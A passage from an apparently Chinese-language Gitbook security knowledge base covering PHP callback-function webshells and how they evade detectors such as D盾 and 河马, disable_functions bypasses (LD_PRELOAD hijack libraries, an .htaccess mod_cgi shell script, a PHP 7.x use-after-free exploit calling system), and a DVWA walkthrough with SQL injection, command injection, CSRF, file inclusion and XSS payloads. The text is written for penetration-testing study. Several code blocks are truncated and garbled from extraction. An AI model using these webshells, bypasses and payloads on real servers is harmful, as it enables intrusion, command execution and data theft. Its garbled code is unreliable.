@$E=substr(base_convert(@fileperms($P),10,8),-4); $R=\" \".$T.\" \".@filesize($P).\" \".$E.\" \"; if(@is_dir($P)) $M.=$N.\"/\".$R; else $L.=$N.$R; } echo $M.$L; @closedir($F); }; }catch(Exception $e){ echo \"ERROR://\".$e->getMessage(); }; asoutput(); die(); &od0d1a967133cb=QzovcGhwU3R1ZHkvV1dXLw== base64_decode(\"QzovcGhwU3R1ZHkvV1dXLw==\")=\"C:/phpStudy/WWW/\" 可以看见，其实用于eval函数执行的代码都是大体相同的，只是更改了try-catch代码块中的逻辑，对于传统的webshell管理工具，连接webshell并且执行相关命令需要使用类似eval,assert等函数将字符串当作php代码执行的性质，当连接成功之后，就可以利用当前web容器可解析的语言执行代码，并完成相关的操作。 脚本要将字符串（或文件流）当做PHP代码来执行，主要会使用到以下函数： eval：PHP 4，PHP 5，PHP 7+ 均可用，接收一个参数，将字符串作为PHP代码执行 //一句话 assert：PHP 4，PHP5，PHP7.2以下均可使用，一般接收一个参数，PHP5.4.8版本后可以接受两个参数 // 一句话 正则匹配类：prge_replace，mb_erge_replace，prge_filter等 // php5.5.0 以下 /e参数还能执行 // 一句话 // php5.5.0+ /e 参数不能使用，推荐使用preg_replace_callback // 一句话马 文件包含类：include，include_once,require,require_once,file_get_contents等 回调函数后门 因为本人太菜了，写不出来大马，只能通过常用的函数来实现webshell。 大部分带有回调函数的函数是php中常用的函数，是可以构造回调函数后门，执行系统命令或者使用webshell管理工具连接的。 register_shutdown_function // (PHP 4, PHP 5, PHP 7) // register_shutdown_function — 注册一个会在php中止时执行的函数 register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) : void // php7+ 存在立即执行函数(function($a){@eval($a)})($_POST['cmd']) array_udiff_assoc // (PHP 5, PHP 7) // array_udiff_assoc — 带索引检查计算数组的差集，用回调函数比较数据 array_udiff_assoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func ) : array array_intersect_uassoc // (PHP 5, PHP 7) // array_intersect_uassoc — 带索引检查计算数组的交集，用回调函数比较索引 array_intersect_uassoc ( array $array1 , array $array2 [, array $... ], callable $key_compare_func ) : array \" \"),array(1),\"assert\"); ?> \" \"),array(1),\"system\"); ?> forward_static_call_array // forward_static_call_array — 调用静态方法并将参数作为数组传递 forward_static_call_array ( callable $function , array $parameters ) : mixed array_intersect_ukey // (PHP 5 >= 5.1.0, PHP 7) // array_intersect_ukey — 用回调函数比较键名来计算数组的交集 1),array(1),\"assert\"); ?> 1),array(1),\"system\"); ?> register_tick_function // register_tick_function — 注册一个函数，以便在每次被标记时执行 register_tick_function ( callable $function [, mixed $arg [, mixed $... ]] ) : bool array_reduce // (PHP 4 >= 4.0.5, PHP 5, PHP 7) // array_reduce — 用回调函数迭代地将数组简化为单一的值 array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed array_udiff // (PHP 5, PHP 7) // array_udiff — 用回调函数比较数据来计算数组的差集 array_udiff ( array $array1 , array $array2 [, array $... ], callable $value_compare_func ) : array eval && assert 区别 为什么eval函数不能做回调函数的后门？而要使用assert? 为什么构造变量函数一般是1=assert&2=command做为密码连接，或者1=system&2=whoami来执行命令，为什么不能使用1=eval&2连接？ eval是一个语言构造器，而不是一个函数，不能被可变函数调用； 官方定义的可变函数： PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途,可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。 安装vld扩展可以清楚的看到php5，php7 assert函数，eval函数在opcode中执行过程 php是解释型语言，所谓“解释型语言”就是指用这种语言写的程序不会被直接编译为本地机器语言（native machine language），而是会被编译为一种中间形式（代码），很显然这种中间形式不可能直接在CPU上执行（因为CPU只能执行本地机器指令），但是这种中间形式可以在使用本地机器指令（如今大多是使用C语言）编写的软件上执行。 PHP使用主要虚拟机（Zend虚拟机，译注：HHVM也是一种执行PHP代码的虚拟机，但很显然Zend虚拟机还是目前的主流）可以分为两大部分，它们是紧密相连的: 编译栈（compile stack）：识别PHP语言指令，把它们转换为中间形式 执行栈（execution stack）：获取中间形式的代码指令并在引擎上执行，引擎是用C或者汇编编写成的 OPCode Zend VM的一个OPCode对应虚拟机的一个底层操作。Zend虚拟机有很多OPCode：它们可以做很多事情。随着PHP的发展，也引入了越来越多的OPCode，这都是源于PHP可以做越来越多的事情。可以在PHP的源代码文件Zend/zend_vm_opcodes.h中看到所有的OPCode。 Zend VM的每个OPCode的工作方式都完全相同：它们都有一个handler（译注：在Zend VM中，handler是一个函数指针，它指向OPCode对应的处理函数的地址，这个处理函数就是用于实现OPCode具体操作的），这是一个C函数，这个函数就包含了执行这个OPCode时会运行的代码（例如“add”，它就会执行一个基本的加法运算）。每个handler都可以使用0、1或者2个操作数：op1和op2，这个函数运行后，它会后返回一个结果，有时也会返回一段信息（extended_value） php5 可以看到eval是INCLUDE_OR_EVAL去处理，而assert是用DO_FCALL去处理 在php源文件Zend/zend_vm_opcodes.h中看到所有的OPCode,其中在Zend/zend_vm_def.h文件中可以看见DO_FCALL这个OPCode的具体操作 在这里说一下第一个判断条件，因为确实不懂，在网上找了与一下相关的解释 //如果EG(active_op_array)->run_time_cache[]数组中存在这个值，就取出来，毕竟C原生态数组取数据速度要远远超过zend_hash_quick_find(毕竟他要计算hash值，还要遍历，不能达到真正的O(1) if (CACHED_PTR(opline->op1.literal->cache_slot)) { ce = CACHED_PTR(opline->op1.literal->cache_slot); } 如果C原生态数组里没有这个函数，就会进入else if中，进行一个哈希查找，并把函数指针放入 EX(function_state).function，最后再调用该函数 然后再看看INCLUDE_OR_EVAL 到这里就可以看到为什么eval参数中必须是php代码，而不是命令，当在eval中的参数为命令的时候，就会出现eval() 'd code的错误，当参数为php代码的时候，就会直接编译执行参数。 从OPCode中可以看到，eval就是Zend函数，assert是宏编写的，最后在调用上是不同的 php7 所以在php7+中，assert断言也已经成为语言解释器，再也不是函数了，所以在php7中使用assert作为回调后门不能成功的原因就在于此。 椒图7.2.1.0&&河马&&D盾检测结果比较 河马 D盾 椒图7.2.1.0 其中椒图未检测出webshell的原理图如下表 webshell 原理 3.php register_shutdown_function ( callable $callback [, [mixed] $parameter [,mixed $... ]] ) : void其中$callback回调函数，它会在脚本执行完之后或者exit()之后执行 5s.php array_intersect_uassoc ( array $array1 , array $array2 [, array $... ],callable $key_compare_func ) : array索引检查计算数组的交集，用回调函数比较索引其中$f 是通过hex2bin 与文件最后一个字符以s 命名结合而成assert，由于php7.1+不可用assert函数，靶机环境7.2，故未成功 7.php array_intersect_ukey ( array $array1 , array $array2 [, array $... ],callable $key_compare_func ) : array用回调函数比较键名来计算数组的交集其中通过HTTP Headers Cookie[set-domain-name]将ass 字符与ert 字符拼接,构成assert 将其构造成回调函数，并利用，由于php7.1+不可用assert函数，靶机环境7.2，故未成功 8.php 同5s.php，只不过是为了绕过文件上传后文件重命名，不能截取对应的字符构成assert ；所以对所有的字符做了一个key,当检索到key 就将其转换，并构成assert test_6.php forward_static_call_array ( callable $function , array $parameters ) : mixed调用function 参数给定的用户定义函数或方法。此函数必须在方法上下文中调用，不能在类外部使用。它使用后期静态绑定。与call_user_func_array()类似,转发的方法的所有参数都作为值和数组传递。其中通过HTTP Headers [Referer],截取(-7,-4)的三个字符 比如http://www.target.com/sys.php截取sys 这个字符与tem 组合构成system test_7.php 同7.php，由于目标靶机php版本为7.2，assert断言无法使用，故改为system()执行系统命令 bypass.php 绕php7.0-7.4中disable_function的poc，且可执行命令 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:54:02 "},"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.html":{"url":"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.html","title":"11.ByPaass disable Function","keywords":"","body":"PHP ByPass Disbale_Function 在获取一枚webshell的时候，尝试命令执行，却发现无法执行命令，那么就是php.ini中设置了disable_functions PHP内置系统执行函数 system() string system ( string $command [, int &$return_var ] ); # $command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # system 函数执行有回显，可将结果显示在页面上 passthru() void passthru ( string $command [, int &$return_var ] ); # 和system函数类似，$command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # passthru 执行有回显，可将执行结果显示在页面上 exec() string exec ( string $command [, array &$output [, int &$return_var ]] ); # $command是要执行的命令 # $output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败） # exec()函数执行无回显，默认返回最后一行结果 shell_exec() string shell_exec( string &command); # $command是要执行的命令 # shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面 # `(反引号) shell_exec() 函数实际上仅是反引号 (`) 操作符的变体，当禁用shell_exec时，` 也不可执行 # 在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回 popen() resource popen ( string $command , string $mode ); # 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。此指针可以用于fgets()，fgetss()和 fwrite() shell.php 反弹shell proc_open() resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd [, array $env [, array $other_options ]]] ); # 与Popen函数类似，但是可以提供双向管道 shell.php 反弹shell pcntl_exec() void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 args是一个要传递给程序的参数的字符串数组。 pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。 pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0 LD_PRELOAD绕过 LD_PRELOAD是linux系统下的环境变量，它允许你在定义程序运行前优先加载动态链接库，这个功能只要是用来有选择性的载入不同的不同动态链接库的中的相同函数。通过这个环境变量，可以在主程序和其他动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面可以使用自己的或是更好的的函数（无需别人的源码），而另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。 找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 提供了劫持系统函数的能力，但前提是必须得控制 php 启动外部程序才行（只要有进程启动行为即可，无所谓是谁） ，经过探索可以知道php中的mail()函数调用之后会启动sendmail这个进程。 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于 LD_PRELOAD 的作用，sendmail 调用的系统函数 geteuid() 被优先级更好的 geteuid_shadow.so 中的同名 geteuid() 所劫持。 EXP-1 动态链接库C脚本 #define _GNU_SOURCE #include #include #include extern char** environ; int geteuid () { const char* cmdline = \"whoami > /var/www/html/test.txt\" int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } system(cmdline); } php脚本 将劫持代码编译成动态链接库 ,若目标为 x86 架构，需要加上 -m32 选项重新编译 gcc -fPIC -shared test.c -o test.so 分别将动态库test.so文件，php脚本test.php上传到服务器中，再访问test.php脚本文件，如果成功将geteuid函数劫持，那么将会把whoami命令结果重定向在/var/www/html/test.txt文件中 在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。基于这两个原因，不得不放弃劫持函数 geteuid()，必须找个更实用的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了。 GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 unsetenv(\"LD_PRELOAD\")，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 extern char** environ！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 EXP-2 动态链接库C脚本 #define _GNU_SOURCE #include #include #include extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } \" . $out_path . \" 2>&1\"; echo \" cmdline: \" . $evil_cmdline . \"\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \" output: \" . nl2br(file_get_contents($out_path)) . \"\"; unlink($out_path); ?> 首先先编译c脚本为动态链接库 gcc -fPIC -shared hack.c -o hack.so 分别将动态库hack.so文件，php脚本hack.php上传到服务器中，再访问hack.php脚本文件，并带上参数cmd(待执行的命令)，outpath(结果重定向文件位置),sopath(加载动态链接库的位置) EXP-3 error_log + putenv error_log(error,type,destination,headers) ， 当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址 error_log(\"test\", 1, \"\", \"\"); .htaccess 不止重定向绕过 在apache的WEB环境中，经常会使用.htaccess这个文件来确定某个目录下的URL重写规则， 但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令 “任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。” 首先需要满足几个条件， 必须是apache环境 mod_cgi已经启用 必须允许.htaccess文件，也就是说在httpd.conf(apache2.conf)中，要注意AllowOverride选项为All，而不是none 必须有权限写.htaccess文件 在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用 Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用, 允许使用mod_cgi模块执行CGI脚本那么用到的就是ExecCGI选项， AddHandler是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理 有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。 EXP \\n\"; } if(!isset($_GET['checked'])) { @file_put_contents('.htaccess',\"\\nSetEnv HTACCESS on\", FILE_APPEND); header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查 } else { $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启 $writable = is_writable('.'); //检测当前目录是否可写 $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess checkEnabled(\"Mod-Cgienabled\",$modcgi,\"Yes\",\"No\"); checkEnabled(\"Iswritable\",$writable,\"Yes\",\"No\"); checkEnabled(\"htaccessworking\",$htaccess,\"Yes\",\"No\"); if(!($modcgi && $writable&& $htaccess)) { echo \"Error. All of the above mustbe true for the script to work!\"; //必须满足所有条件 } else { checkEnabled(\"Backing up.htaccess\",copy(\".htaccess\",\".htaccess.bak\"),\"Suceeded!Saved in .htaccess.bak\",\"Failed!\"); //备份一下原有.htaccess checkEnabled(\"Write .htaccessfile\",file_put_contents('.htaccess',\"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"),\"Succeeded!\",\"Failed!\");//.dizzle，我们的特定扩展名 checkEnabled(\"Write shellfile\",file_put_contents('shell.dizzle',$shellfile),\"Succeeded!\",\"Failed!\");//写入文件 checkEnabled(\"Chmod777\",chmod(\"shell.dizzle\",0777),\"Succeeded!\",\"Failed!\");//给权限 echo \"Executing the script now.Check your listener. \"; } } ?> PHP特定版本bypass Target 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 7.4 EXP a); $backtrace = (new Exception)->getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP >= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j >= 0; $j--) { $address >= 8; } return $out; } function write(&$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i >= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper->a); if($s != 8) { $leak %= 2 0 && $leak - $base 0 && $leak - $base a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i b)($cmd); exit(); } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-18 10:22:01 "},"知识库/01.WEB安全/99.其他/12.DVWA通关记录.html":{"url":"知识库/01.WEB安全/99.其他/12.DVWA通关记录.html","title":"12.DVWA通关记录","keywords":"","body":"DVWA 通关指南 LOW BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed echo \"Username and/or password incorrect.\"; } mysql_close(); } ?> 分析代码，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username，password，没有做任何过滤就直接带入数据库查询，并没有做相关的处理，所以可以尝试万能密码登录 万能密码 username = admin'# password = all username = admin' or '1'='1 password = all burp爆破，top 500_user,top100_password 尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。 Command Injection 命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞 {$cmd}\"; } ?> 相关函数介绍 stristr(string,search,before_search) stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值的字符），可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。 php_uname(mode) 这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞 漏洞利用 window和linux系统都可以用&&来执行多条命令 127.0.0.1&&net user 127.0.0.1&&cat /etc/shadow 127.0.0.1&& whoami CSRF CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等） ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } mysql_close(); } ?> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。 漏洞利用 使用burp抓包，可以看到请求中包含了修改密码 1.将url copy下来 http://192.168.124.131/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change 当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了） 需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会触发的，因为火狐浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。 2.短链接 可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：http://mrw.so/4NnRyv 虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明 3.构造攻击页面 使用burp抓包之后，使用Generate CSRF POC 功能，可以生成简单的HTML代码，如下 但是此代码打开效果就一个button，需要点击才会触发，如果点击之后，那么受害者也会发现自己的密码被更改了，所以此方法只是用来测试是否存在CSRF，在得知请求之后可以使用如img，body标签，直接请求 404 您访问的页面不存在 --> 404 您访问的页面不存在 --> 404 您访问的页面不存在 function getCSRF(){ var img = document.createElement('img') img.src = 'http://192.168.124.131/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change' img.style.display = 'none' document.body.appendChild(img) } File Inclusion File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件） 可以看到，服务器端对page参数没有做任何的过滤和检查。 服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 漏洞利用 1.本地文件包含 构造url http://192.168.124.131/vulnerabilities/fi/?page=/etc/passwd 成功读取/etc/passwd文件 由于环境是在docker中，shadow是 rw-r-----，当前不是root用户，所以修改权限 644 就可以读取shadow文件 2.远程文件包含 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。在远程服务器192.168.124.1上传一个info.txt文件，内容如下 构造url为 http://192.168.124.131/vulnerabilities/fi/?page=http://192.168.124.1/upload/upload/info.txt 成功在服务器上执行了phpinfo函数 为了增强隐蔽性可以对 http://192.168.124.1/upload/upload/info.txt进行编码 http://192.168.124.131/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%32%34%2e%31%2f%75%70%6c%6f%61%64%2f%75%70%6c%6f%61%64%2f%69%6e%66%6f%2e%74%78%74 File upload 文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } ?> basename(path,suffix) 函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 可以看到文件上传没有做任何限制，可以上传任何文件，上传一句话拿到webshell 使用蚁剑直接连接，口令为Cknife，然后蚁剑就会通过向服务器发送包含Cknife参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件 SQL Injection SQL注入,是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一 1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 查看源码，发现注入点是id，并且是字符型注入，服务端接收id参数，没有做任何处理，并且有回显，和报错详情，可以使用联合查询和报错注入以及时间盲注来实现手工注入 union order by 猜列数 paylod： 1' order by 2# 爆当前库，版本信息 payload: -1' union select database(),version()# 爆库 payload: -1' union select 1,group_concat(schema_name) from information_schema.schemata# 爆表 payload: -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()# 爆列 payload: -1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users'# 报错注入 updatexml() payload: 1' and updatexml(1,concat(0x23,database()),1)# payload: 1' and updatexml(1,concat(0x23,(select table_name from information_schema.tables where table_schema = database() limit 1 offset 0)),1)# extractvalue() payload: 1' and extractvalue(1,concat(0x23,database()))# payload: 1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema = database() limit 1 offset 0)))# floor payload: 1' and (SELECT 1 from (SELECT count(*),concat(0x23, database(), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y)# payload: 1' and (SELECT 1 from (SELECT count(*),concat(0x23, (select table_name from information_schema.tables where table_schema = database() limit 0,1), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y)# 时间盲注 payload: 1' and if(1=1,sleep(2),0)# payload: 1' and if(ascii(substr(database(),1,1))SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 基于布尔盲注需要页面有回显，此时当页面查询出正确的值，$num>0,则是正确的回显，User ID exists in the database. 否则则是错误的回显，说明sql查询不存在回显为User ID is MISSING from the database 布尔盲注 payload: 1' and ascii(substr(database(),1,1))时间盲注 payload: 1' and if(1=1,sleep(2),1)# payload: 1' and if(1=2,sleep(2),1)# XSS（ Reflected） Hello ' . $_GET[ 'name' ] . ''; } ?> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞(反射型XSS) 在input框输入 alert('123') 可以构造url为 http://192.168.124.131/vulnerabilities/xss_r/?name=alert('xss') 对参数name进行url编码 http://192.168.124.131/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%78%73%73%27%29%3c%2f%73%63%72%69%70%74%3e XSS（Stored） ' . mysql_error() . '' ); //mysql_close(); } ?> 相关函数介绍 trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符 mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义 stripslashes(string)函数删除字符串中的反斜杠 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞 message一栏输入alert(/xss/)，成功弹框： name一栏前端有字数限制，抓包改为alert(/name/) 成功弹框 Medium BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed sleep( 2 ); echo \"Username and/or 